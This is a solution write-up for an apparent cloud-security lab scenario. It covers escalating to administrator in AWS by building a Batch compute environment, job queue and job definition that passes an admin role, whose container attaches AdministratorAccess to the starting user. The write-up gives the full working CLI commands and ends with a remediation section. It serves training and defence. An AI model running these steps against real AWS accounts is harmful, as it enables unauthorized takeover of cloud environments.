# Solution: AWS Batch Full Pipeline Creation to Admin

This scenario demonstrates the most powerful variant of the AWS Batch privilege escalation pattern: an attacker who can build the entire Batch pipeline from scratch. Unlike batch-001 (which requires a pre-existing compute environment and job queue) or batch-002 (which requires a pre-existing job definition), this attacker needs nothing but IAM permissions and a VPC subnet. They create a Fargate compute environment, wire up a job queue, register a job definition with a privileged role, and submit the job -- all without any ECS permissions.

The subtlety that makes this path dangerous is that `batch:CreateComputeEnvironment` auto-creates an ECS cluster through the AWS Batch service-linked role. An attacker with only Batch permissions ends up with full ECS task execution capability, launching containers that run under any IAM role they can pass. Security teams reviewing IAM policies often check for ECS permissions when looking for container-based privilege escalation, but this path bypasses ECS entirely -- the attacker never touches the ECS API directly.

In real environments, this permission set appears when data or ML engineers are given broad Batch access to build and manage their own compute pipelines. The `iam:PassRole` permission is granted so they can assign execution roles to their workloads. When those same principals can also pass administrative roles, the result is a full privilege escalation path that requires zero pre-existing infrastructure.

## The Challenge

You start as `pl-prod-batch-003-to-admin-starting-user` -- an IAM user whose credentials were provided via Terraform outputs. Your permission set is extensive for Batch: you can create compute environments, create job queues, register job definitions, and submit jobs. You also have `iam:PassRole` on two roles -- an admin role and an execution role. But you have no direct path to admin: no `sts:AssumeRole`, no `iam:AttachUserPolicy`, no way to modify your own permissions.

The target is `pl-prod-batch-003-to-admin-admin-role`, an IAM role carrying `AdministratorAccess`. Its trust policy only permits `ecs-tasks.amazonaws.com` -- you cannot assume it directly. But you can pass it to a Batch job definition, and you have every Batch permission needed to build the infrastructure that will run that job.

The environment gives you almost nothing to start with: a security group, a VPC subnet, and the two IAM roles. There is no compute environment, no job queue, no job definition. You must build it all.

## Reconnaissance

Start by confirming your identity and understanding your permissions:

```bash
aws sts get-caller-identity
```

Inspect your inline policy to see the full permission set:

```bash
aws iam list-user-policies --user-name pl-prod-batch-003-to-admin-starting-user
aws iam get-user-policy --user-name pl-prod-batch-003-to-admin-starting-user \
    --policy-name pl-prod-batch-003-to-admin-required-permissions
```

You will see `iam:PassRole` scoped to the admin and execution role ARNs, plus the full set of Batch permissions for building the pipeline. The helpful permissions -- `batch:DescribeComputeEnvironments`, `batch:DescribeJobQueues`, `batch:DescribeJobs`, `batch:DescribeJobDefinitions`, and `iam:ListAttachedUserPolicies` -- give you visibility during the attack and verification afterward. Resource teardown (disabling/deleting the compute environment and job queue) is performed with admin credentials, not the starting user's.

Unlike batch-001, there are no existing Batch resources to discover. Verify this:

```bash
aws batch describe-compute-environments --query 'computeEnvironments[*].{Name:computeEnvironmentName,State:state}'
aws batch describe-job-queues --query 'jobQueues[*].{Name:jobQueueName,State:state}'
```

Both should return empty lists. You are starting from nothing.

## Exploitation

### Step 1: Create a Fargate compute environment

First, create a managed Fargate compute environment. This tells AWS Batch where to run containers. Behind the scenes, Batch uses its service-linked role to auto-create an ECS cluster -- you get ECS task execution without any ECS permissions.

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
REGION="us-east-1"  # adjust to your deployed region

aws batch create-compute-environment \
    --compute-environment-name pl-batch-003-privesc-compute-env \
    --type MANAGED \
    --compute-resources "{
        \"type\": \"FARGATE\",
        \"maxvCpus\": 2,
        \"subnets\": [\"<subnet-id>\"],
        \"securityGroupIds\": [\"<security-group-id>\"]
    }"
```

Wait for the compute environment to reach `VALID` status. This typically takes 10-30 seconds:

```bash
aws batch describe-compute-environments \
    --compute-environments pl-batch-003-privesc-compute-env \
    --query 'computeEnvironments[0].status' --output text
```

### Step 2: Create a job queue

With the compute environment ready, create a job queue that routes jobs to it:

```bash
aws batch create-job-queue \
    --job-queue-name pl-batch-003-privesc-job-queue \
    --priority 1 \
    --compute-environment-order '[{"order":1,"computeEnvironment":"pl-batch-003-privesc-compute-env"}]'
```

Wait for the job queue to reach `VALID` status:

```bash
aws batch describe-job-queues \
    --job-queues pl-batch-003-privesc-job-queue \
    --query 'jobQueues[0].status' --output text
```

### Step 3: Register a job definition with the admin role

Now register a job definition using the `amazon/aws-cli` container image. Pass the admin role as `jobRoleArn` -- this is where `iam:PassRole` comes into play. The container command attaches `AdministratorAccess` to the starting user.

```bash
STARTING_USER="pl-prod-batch-003-to-admin-starting-user"
ADMIN_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-batch-003-to-admin-admin-role"
EXECUTION_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-batch-003-to-admin-execution-role"

aws batch register-job-definition \
    --job-definition-name pl-batch-003-privesc-job-def \
    --type container \
    --platform-capabilities FARGATE \
    --container-properties "{
        \"image\": \"amazon/aws-cli:latest\",
        \"jobRoleArn\": \"$ADMIN_ROLE_ARN\",
        \"executionRoleArn\": \"$EXECUTION_ROLE_ARN\",
        \"resourceRequirements\": [
            {\"type\": \"VCPU\", \"value\": \"0.25\"},
            {\"type\": \"MEMORY\", \"value\": \"512\"}
        ],
        \"networkConfiguration\": {\"assignPublicIp\": \"ENABLED\"},
        \"command\": [
            \"iam\", \"attach-user-policy\",
            \"--user-name\", \"$STARTING_USER\",
            \"--policy-arn\", \"arn:aws:iam::aws:policy/AdministratorAccess\"
        ]
    }"
```

Note the `revision` field in the response.

### Step 4: Submit the job

Submit the job to your attacker-created queue:

```bash
aws batch submit-job \
    --job-name pl-batch-003-privesc-job \
    --job-queue pl-batch-003-privesc-job-queue \
    --job-definition pl-batch-003-privesc-job-def:1
```

Note the `jobId` in the response.

### Step 5: Wait for the job to complete

Fargate must provision a container instance before running the job. Poll every 15 seconds until the status shows `SUCCEEDED`. This typically takes 1-3 minutes.

```bash
JOB_ID="<job-id from previous step>"

aws batch describe-jobs --jobs "$JOB_ID" \
    --query 'jobs[0].status' --output text
```

If the status shows `FAILED`, check the reason:

```bash
aws batch describe-jobs --jobs "$JOB_ID" \
    --query 'jobs[0].statusReason' --output text
```

## Verification

Once the job succeeds, wait 15 seconds for IAM policy propagation, then verify that `AdministratorAccess` was attached to the starting user:

```bash
sleep 15
aws iam list-attached-user-policies --user-name pl-prod-batch-003-to-admin-starting-user
```

Confirm admin access using the starting user's credentials:

```bash
aws iam list-users --max-items 3
```

If this succeeds, you have achieved administrator access.

## Capture the Flag

Admin access is not the finish line -- the flag is. Every Pathfinding Labs scenario stores a flag in a well-known location, and retrieving it proves the end-to-end attack worked. For `to-admin` scenarios, the flag lives in AWS Systems Manager Parameter Store at a predictable path under `/pathfinding-labs/flags/`. Reading it requires `ssm:GetParameter` on that specific parameter, which the `AdministratorAccess` managed policy now attached to your starting user provides implicitly.

Using your starting user credentials (which now hold `AdministratorAccess`), read the flag:

```bash
aws ssm get-parameter \
    --name /pathfinding-labs/flags/batch-003-to-admin \
    --query 'Parameter.Value' \
    --output text
# flag{...}  -- your scenario-specific flag value
```

The value printed is the flag you submit to complete the challenge. Its exact contents are deployment-specific.

## What Happened

You exploited the most self-sufficient variant of the AWS Batch privilege escalation pattern. Where batch-001 requires pre-existing infrastructure and batch-002 requires a pre-existing job definition, this path requires nothing but IAM permissions and network connectivity. You built the entire pipeline -- compute environment, job queue, job definition -- then submitted a job that ran a container under an administrative IAM role.

The key insight is that `batch:CreateComputeEnvironment` auto-creates an ECS cluster through the Batch service-linked role. An attacker with Batch permissions effectively has ECS task execution capability without any ECS permissions in their policy. Security teams scanning for container-based privilege escalation paths must treat `batch:CreateComputeEnvironment` + `batch:CreateJobQueue` + `batch:RegisterJobDefinition` + `batch:SubmitJob` + `iam:PassRole` as equivalent to direct ECS task execution with a privileged role.

The fix is the same across all Batch variants: ensure that any role passable to Batch carries only the minimum permissions needed for legitimate workloads. Restrict `iam:PassRole` with an `iam:PassedToService` condition key and scope the resource constraint to non-privileged role name patterns. For this specific variant, also consider whether principals truly need `batch:CreateComputeEnvironment` and `batch:CreateJobQueue` -- most data engineers submit jobs to existing infrastructure rather than creating their own.
